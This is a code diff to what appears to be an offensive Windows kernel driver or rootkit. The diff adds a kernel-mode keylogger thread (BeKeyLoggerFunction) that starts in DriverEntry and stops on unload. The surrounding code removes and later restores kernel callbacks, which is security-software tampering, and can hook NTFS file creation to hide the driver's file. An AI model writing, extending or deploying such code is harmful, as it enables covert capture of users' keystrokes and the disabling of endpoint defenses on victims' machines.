@@ -16,6 +16,8 @@
 
 // --------------------------------------------------------------------------------------------------------
 
+HANDLE hKeyloggerThread;
+
 /**
  * Called on unloading the driver.
  *
@@ -26,6 +28,14 @@ NTSTATUS
 BeUnload(PDRIVER_OBJECT DriverObject)
 {
     LOG_MSG("Unload Called \r\n");
+
+    BeGlobals::runKeyLogger = false;
+    // Wait for keylogger to stop running TODO proper signaling
+    LARGE_INTEGER interval;
+    interval.QuadPart = -1 * (LONGLONG)500 * 10000;
+    KeDelayExecutionThread(KernelMode, FALSE, &interval);
+    // Close thread handle
+    ZwClose(hKeyloggerThread);
 
     // Restore kernel callbacks
     {
@@ -39,10 +49,9 @@ BeUnload(PDRIVER_OBJECT DriverObject)
                 auto callbackAddr = BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length];
                 auto callbackType = BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length];
 
-                LOG_MSG("Restoring kernel callback function -> callbackToRestore 0x%llx\n", callbackToRestore);
-
                 if (callbackToRestore != NULL)
                 {
+                    LOG_MSG("Restoring kernel callback function -> callbackToRestore 0x%llx\n", callbackToRestore);
                     switch (callbackType)
                     {
                     case CreateProcessNotifyRoutine:
@@ -184,14 +193,24 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
         return NtStatus;
     }
 
-    // TODO REMOVE
-    BeGetGafAsyncKeyStateAddress();
-
     NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
+    if (NtStatus != 0)
+    {
+        return NtStatus;
+    }
 
 #if DENY_DRIVER_FILE_ACCESS
     NtStatus = BeHookNTFSFileCreate();
 #endif
+
+    // Start Keylogger Thread
+    BeGlobals::runKeyLogger = true;
+    PKTHREAD ThreadObject;
+    NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
+    if (NtStatus != 0)
+    {
+        return NtStatus;
+    }
 
     return NtStatus;
 }
